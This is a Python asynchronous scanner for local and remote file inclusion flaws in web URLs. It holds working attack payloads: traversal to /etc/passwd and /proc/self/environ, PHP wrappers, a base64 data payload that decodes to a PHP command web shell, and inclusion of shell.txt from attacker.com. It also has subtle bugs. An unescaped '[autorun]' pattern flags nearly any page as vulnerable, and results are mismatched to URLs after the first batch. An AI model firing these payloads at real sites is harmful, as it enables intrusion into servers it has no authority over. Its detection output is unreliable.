import os
import json
import asyncio
import aiohttp
import re
from datetime import datetime
from urllib.parse import urlparse, urljoin, parse_qs, urlencode
from aiohttp import ClientTimeout, TCPConnector
from logger import get_logger

logger = get_logger(__name__)

class LFIScanner:
    """Scanner for detecting Local File Inclusion (LFI) and Remote File Inclusion (RFI) vulnerabilities."""
    
    def __init__(self):
        """Initialize the LFI scanner with configuration and resources."""
        self.results_dir = "lfi_results"
        os.makedirs(self.results_dir, exist_ok=True)
        
        # Scanner configuration
        self.timeout = ClientTimeout(total=10)  # 10 seconds timeout
        self.max_retries = 3
        self.concurrent_limit = 10
        self.session = None
        self.semaphore = None
        
        # Load payloads and indicators
        self._initialize_payloads()
        self._initialize_indicators()

    def _initialize_payloads(self):
        """Initialize attack payloads with categories."""
        self.lfi_payloads = {
            'unix_paths': [
                '../../../etc/passwd',
                '....//....//....//etc/passwd',
                '/../../../etc/passwd',
                '/etc/passwd%00',  # Null byte injection
                '../../../../../../etc/passwd',
                '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',  # URL encoded
                '....//....//....//....//etc/passwd',
                '/var/log/apache2/access.log',
                '/var/log/apache/access.log',
                '/proc/self/environ'
            ],
            'windows_paths': [
                '../../../windows/win.ini',
                '..\\..\\..\\windows\\win.ini',
                'C:\\windows\\win.ini',
                '../../../../windows/win.ini',
                '%SYSTEMROOT%/win.ini'
            ],
            'php_wrappers': [
                'php://filter/convert.base64-encode/resource=index.php',
                'php://input',
                'php://filter/read=convert.base64-encode/resource=index.php',
                'phar://test.phar/test.txt',
                'zip://test.zip#test.txt'
            ],
            'data_wrappers': [
                'data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=',
                'expect://id',
                'glob://../../etc/passwd'
            ]
        }
        
        self.rfi_payloads = {
            'http': [
                'http://{external_domain}/shell.txt',
                'https://{external_domain}/shell.txt',
                '//{external_domain}/shell.txt'
            ],
            'protocol': [
                'ftp://{external_domain}/shell.txt',
                'gopher://{external_domain}/_GET%20/',
                'dict://{external_domain}:11111/DEFINED:test'
            ]
        }

    def _initialize_indicators(self):
        """Initialize vulnerability indicators with categories."""
        self.indicators = {
            'unix': [
                r'root:x:\d+:\d+:',
                r'bin:x:\d+:\d+:',
                r'daemon:x:\d+:\d+:',
                r'nobody:x:\d+:\d+:',
                r'/home/\w+:/bin/bash'
            ],
            'windows': [
                r'\[boot loader\]',
                r'\[operating systems\]',
                r'[autorun]',
                r'shell=\\windows\\'
            ],
            'server': [
                r'HTTP_USER_AGENT',
                r'HTTP_ACCEPT',
                r'PATH=/',
                r'DOCUMENT_ROOT=',
                r'SERVER_SOFTWARE='
            ],
            'php': [
                r'<\?php',
                r'Fatal error:',
                r'Warning:',
                r'include\(',
                r'require_once\('
            ]
        }

    async def initialize(self):
        """Initialize scanner resources."""
        if not self.session:
            connector = TCPConnector(limit=self.concurrent_limit)
            self.session = aiohttp.ClientSession(
                connector=connector,
                timeout=self.timeout
            )
        if not self.semaphore:
            self.semaphore = asyncio.Semaphore(self.concurrent_limit)

    async def cleanup(self):
        """Cleanup scanner resources."""
        if self.session:
            await self.session.close()
            self.session = None

    async def scan_urls(self, urls):
        """
        Scan multiple URLs for LFI/RFI vulnerabilities.
        
        Args:
            urls (list): List of URLs to scan.
            
        Returns:
            dict: Scan results for each URL.
        """
        try:
            logger.info(f"Starting LFI/RFI scan for {len(urls)} URLs")
            await self.initialize()
            
            results = {}
            tasks = []
            
            # Create scanning tasks with rate limiting
            for url in urls:
                task = asyncio.create_task(self._scan_url_with_retry(url))
                tasks.append(task)
            
            # Execute tasks in batches
            for batch in self._batch_tasks(tasks, batch_size=5):
                batch_results = await asyncio.gather(*batch, return_exceptions=True)
                for url, result in zip(urls, batch_results):
                    if isinstance(result, Exception):
                        logger.error(f"Error scanning {url}: {result}")
                    elif result:
                        results[url] = result
            
            return results
            
        except Exception as e:
            logger.error(f"Error in LFI/RFI scan: {e}")
            return {}
        finally:
            await self.cleanup()

    def _batch_tasks(self, tasks, batch_size):
        """Split tasks into batches."""
        for i in range(0, len(tasks), batch_size):
            yield tasks[i:i + batch_size]

    async def _scan_url_with_retry(self, url):
        """Scan a URL with retry mechanism."""
        for attempt in range(self.max_retries):
            try:
                async with self.semaphore:
                    return await self._scan_url(url)
            except aiohttp.ClientError as e:
                if attempt == self.max_retries - 1:
                    logger.error(f"Max retries reached for {url}: {e}")
                    raise
                await asyncio.sleep(2 ** attempt)  # Exponential backoff
            except Exception as e:
                logger.error(f"Unexpected error scanning {url}: {e}")
                raise

    async def _scan_url(self, url):
        """Test a single URL for LFI/RFI vulnerabilities."""
        try:
            parsed_url = urlparse(url)
            vulnerabilities = []
            
            # Get potential injection points
            injection_points = self._find_injection_points(url)
            
            # Test each injection point
            for point in injection_points:
                # Test LFI payloads
                for category, payloads in self.lfi_payloads.items():
                    for payload in payloads:
                        test_url = self._inject_payload(url, payload, point)
                        vuln = await self._test_lfi(test_url)
                        if vuln:
                            vuln['injection_point'] = point
                            vuln['category'] = category
                            vulnerabilities.append(vuln)
                
                # Test RFI payloads
                for category, payloads in self.rfi_payloads.items():
                    for payload in payloads:
                        test_url = self._inject_payload(
                            url,
                            payload.format(external_domain='attacker.com'),
                            point
                        )
                        vuln = await self._test_rfi(test_url)
                        if vuln:
                            vuln['injection_point'] = point
                            vuln['category'] = category
                            vulnerabilities.append(vuln)

            if vulnerabilities:
                result = {
                    'is_vulnerable': True,
                    'vulnerabilities': vulnerabilities,
                    'recommendations': self._get_recommendations(vulnerabilities),
                    'risk_level': self._calculate_risk_level(vulnerabilities),
                    'timestamp': datetime.utcnow().isoformat()
                }
                
                # Save detailed results
                self._save_results(url, result)
                return result

            return None

        except Exception as e:
            logger.error(f"Error scanning URL {url}: {e}")
            return None

    def _find_injection_points(self, url):
        """Find potential injection points in URL."""
        parsed = urlparse(url)
        points = []
        
        # Check query parameters
        if parsed.query:
            params = parse_qs(parsed.query)
            points.extend([f"{k}=" for k in params.keys()])
        
        # Check path components
        path_parts = parsed.path.split('/')
        if len(path_parts) > 1:
            points.extend([f"{part}=" for part in path_parts if '.' in part])
        
        # Add default injection point if none found
        if not points:
            points.append('file=')
        
        return points

    def _inject_payload(self, url, payload, injection_point):
        """Inject payload into URL at specified injection point."""
        parsed = urlparse(url)
        if injection_point in url:
            # Replace existing parameter value
            query_dict = parse_qs(parsed.query)
            param = injection_point.rstrip('=')
            query_dict[param] = [payload]
            new_query = urlencode(query_dict, doseq=True)
            return parsed._replace(query=new_query).geturl()
        else:
            # Add new parameter
            new_query = f"{parsed.query}&{injection_point}{payload}" if parsed.query else f"{injection_point}{payload}"
            return parsed._replace(query=new_query).geturl()

    async def _test_lfi(self, url):
        """Test for LFI vulnerability."""
        try:
            async with self.session.get(url, allow_redirects=True) as response:
                content = await response.text()
                
                for category, patterns in self.indicators.items():
                    for pattern in patterns:
                        match = re.search(pattern, content)
                        if match:
                            return {
                                'type': 'Local File Inclusion',
                                'url': url,
                                'evidence': match.group(0),
                                'pattern': pattern,
                                'indicator_category': category,
                                'severity': 'High',
                                'response_code': response.status
                            }
            return None
        except Exception as e:
            logger.debug(f"Error testing LFI on {url}: {e}")
            return None

    async def _test_rfi(self, url):
        """Test for RFI vulnerability."""
        try:
            async with self.session.get(url, allow_redirects=True) as response:
                if response.status == 200:
                    content = await response.text()
                    if any(indicator in content for indicator in ['<?php', '#!/bin/bash', '<script>']):
                        return {
                            'type': 'Remote File Inclusion',
                            'url': url,
                            'severity': 'Critical',
                            'response_code': response.status
                        }
            return None
        except Exception as e:
            logger.debug(f"Error testing RFI on {url}: {e}")
            return None

    def _calculate_risk_level(self, vulnerabilities):
        """Calculate overall risk level based on vulnerabilities."""
        if any(v['severity'] == 'Critical' for v in vulnerabilities):
            return 'Critical'
        elif any(v['severity'] == 'High' for v in vulnerabilities):
            return 'High'
        return 'Medium'

    def _get_recommendations(self, vulnerabilities):
        """Get specific recommendations based on found vulnerabilities."""
        recommendations = set()
        
        for vuln in vulnerabilities:
            if vuln['type'] == 'Local File Inclusion':
                recommendations.update([
                    "Implement strict input validation and sanitization",
                    "Use whitelisting for allowed files and paths",
                    "Implement proper access controls and file permissions",
                    "Consider using secure file handling functions",
                    "Avoid passing user input directly to file operations"
                ])
            elif vuln['type'] == 'Remote File Inclusion':
                recommendations.update([
                    "Disable allow_url_include in PHP configuration",
                    "Implement strict protocol whitelisting",
                    "Use secure file inclusion methods",
                    "Implement proper input validation and sanitization",
                    "Consider using content security policies (CSP)"
                ])
        
        return list(recommendations)

    def _save_results(self, url, result):
        """Save detailed scan results to file."""
        try:
            filename = os.path.join(
                self.results_dir,
                f"lfi_scan_{datetime.utcnow().strftime('%Y%m%d_%H%M%S')}.json"
            )
            with open(filename, 'w') as f:
                json.dump({
                    'url': url,
                    'scan_result': result,
                    'timestamp': datetime.utcnow().isoformat()
                }, f, indent=2)
        except Exception as e:
            logger.error(f"Error saving results: {e}")